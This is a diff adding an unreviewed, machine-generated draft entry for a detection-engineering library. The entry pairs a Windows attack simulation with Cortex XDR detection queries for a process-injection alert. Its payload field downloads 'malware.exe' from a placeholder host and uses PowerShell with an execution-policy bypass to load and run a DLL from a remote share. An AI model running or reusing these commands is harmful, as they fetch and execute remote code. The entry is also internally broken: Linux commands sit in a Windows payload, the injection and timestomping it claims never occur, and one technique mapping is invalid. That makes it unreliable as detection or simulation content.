@@ -1,0 +1,193 @@
+{
+  "id": "TTP-0000-0283",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Unsigned Process Injection via PowerShell",
+    "summary": "An unsigned and unpopular process performs process injection using PowerShell, which triggers the 'Unsigned and unpopular process performed an injection' alert. Cortex should detect the suspicious Pow",
+    "description": "An unsigned and unpopular process performs process injection using PowerShell, which triggers the 'Unsigned and unpopular process performed an injection' alert. Cortex should detect the suspicious PowerShell process and injection behavior."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1055",
+        "subtechnique_id": "T1055.001",
+        "name": "T1055.001",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      },
+      {
+        "technique_id": "T1070",
+        "subtechnique_id": "T1070.006",
+        "name": "Indicator Removal: Timestomp",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "wget -O /tmp/evil.exe http://192.0.2.50/malware.exe\nstub chmod +x /tmp/evil.exe\npowershell.exe -ExecutionPolicy Bypass -Command \"[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes('\\\\192.0.2.50\\\\payload.dll')); [Payload.Main]::Run()\"\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "PowerShell process started with suspicious command line",
+        "expected_value": "actor_process_image_name = 'powershell.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound connection to C2 server",
+        "expected_value": "action_remote_ip = '192.0.2.50'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "Malware file downloaded from C2",
+        "expected_value": "action_file_path = '/tmp/evil.exe'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Unsigned and Unpopular Process Injection",
+        "description": "Detection of unsigned and unpopular process performing injection",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'powershell.exe'\n| filter action_process_image_name = 'evil.exe'\n| filter causality_actor_process_image_name != 'explorer.exe'\n| filter action_file_path contains '/tmp/evil.exe'",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1055.001",
+          "T1070.006"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Suspicious PowerShell Injection Behavior",
+        "description": "PowerShell process performing injection with unsigned binary",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'powershell.exe'\n| filter action_process_image_name = 'evil.exe'\n| filter causality_actor_process_image_name != 'explorer.exe'\n| filter action_file_path contains '/tmp/evil.exe'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "actor_process_image_name = 'powershell.exe'",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1055.001",
+          "T1070.006"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Process Injection via PowerShell Hunt",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'powershell.exe'\n| filter action_process_image_name = 'evil.exe'\n| filter causality_actor_process_image_name != 'explorer.exe'\n| filter action_file_path contains '/tmp/evil.exe'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Unsigned and unpopular process performed an injection; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/unsigned-and-unpopular-process-performed-an-injection"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Unsigned and unpopular process performed an injection",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/unsigned-and-unpopular-process-performed-an-injection",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.001",
+      "url": "https://attack.mitre.org/techniques/T1059/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1055.001",
+      "url": "https://attack.mitre.org/techniques/T1055/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1070.006",
+      "url": "https://attack.mitre.org/techniques/T1070/006/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
